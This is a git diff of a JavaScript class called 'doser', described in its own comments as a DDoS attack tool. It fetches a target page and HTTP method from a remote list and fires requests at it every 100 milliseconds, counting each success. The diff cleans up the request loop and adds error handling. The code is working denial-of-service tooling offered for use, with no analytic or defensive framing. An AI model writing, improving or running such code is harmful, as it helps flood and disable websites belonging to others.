@@ -41,13 +41,7 @@ class doser {
     	this.attack = true;
 
         // Startup interval of DDoS attack
-        /*
-        fetch("https://google.com", {
-			method: 'GET'
-			mode: 'no-cors',
-			referrerPolicy: 'no-referrer'
-        })
-        */
+
         btn.textContent = "Стоп";
         let target = await getTarget()
         console.log(target)
@@ -60,15 +54,17 @@ class doser {
         this.interval = setInterval(async function () {
             // Requests
 
-            await fetch([target.page], {
-            	method: target.method,
-            	...fetchMode
-            }).then(() => {
-                // After requests
+            try {
+	            await fetch([target.page], {
+	            	method: target.method,
+	            	...fetchMode
+	            }).then(() => {
+	                // After requests
 
-                console.log("Ok!");
-                add_count();
-            })//.catch(catchErr)
+	                console.log("Ok!");
+	                add_count();
+	            })
+        	} catch (e) {this.stop()}
         }, 100);
     };
     stop() {
